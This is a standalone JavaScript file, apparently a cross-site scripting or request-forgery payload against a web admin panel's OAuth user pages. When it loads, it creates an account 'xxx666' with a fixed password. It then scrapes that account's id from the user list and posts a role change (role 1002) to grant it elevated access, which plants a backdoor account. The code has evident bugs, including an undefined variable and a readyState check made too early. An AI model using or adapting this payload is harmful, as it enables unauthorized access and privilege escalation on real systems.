function loadXMLDoc() {
	console.log("start xxx");
	var xmlhttp;
	var domain=document.location.protocol+"//"+document.domain;
	console.log(domain);
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp1 = new XMLHttpRequest();
        xmlhttp2 = new XMLHttpRequest();
		xmlhttp3 = new XMLHttpRequest();
    } else { // code for IE6, IE5
        xmlhttp1 = new ActiveXObject("Microsoft.XMLHTTP");
        xmlhttp2 = new ActiveXObject("Microsoft.XMLHTTP");
	xmlhttp3 = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp1.onreadystatechange = function() {
        if (xmlhttp1.readyState == 4 && xmlhttp1.status == 200) {
		console.log("start xxx222");
            filepath = xmlhttp1.responseText;
			
			xmlhttp3.open('GET', domain+'/oauth/user.htm', true);
			xmlhttp3.send(null);
			if (xmlhttp3.readyState == 4 && xmlhttp3.status == 200) {
					var code = xmlHttp.responseText;
					tbody = code.match(/<tbody>[\s\S]*<\/tbody>/)[0];
					var strs=new Array();
					strs = tbody.split("</tr>");
					for(var i=0;i<strs.length;i++){
					var tr=strs[i];
					if(tr.indexOf("xxx666") >= 0){
						var id=tr.match(/ajax\?ids=[\s\S]*action-tips/)[0];
						var userid=id.replace(/[^0-9]/ig,"");
						console.log(userid);
						if(userid != ""){
								xmlhttp2.open("POST", domain+"/oauth/user/set_role.ajax", true);
								xmlhttp2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
								xmlhttp2.send("id="+userid+"&roleIds=1002");
							}
						}
					}
			}
        }

    }
    xmlhttp1.open("POST", domain+"/oauth/user/save.ajax", true);
    xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xmlhttp1.send("userName=xxx666&loginPassword=aa123456&confirmPassword=aa123456");
	console.log("start xxx333");

}
loadXMLDoc();
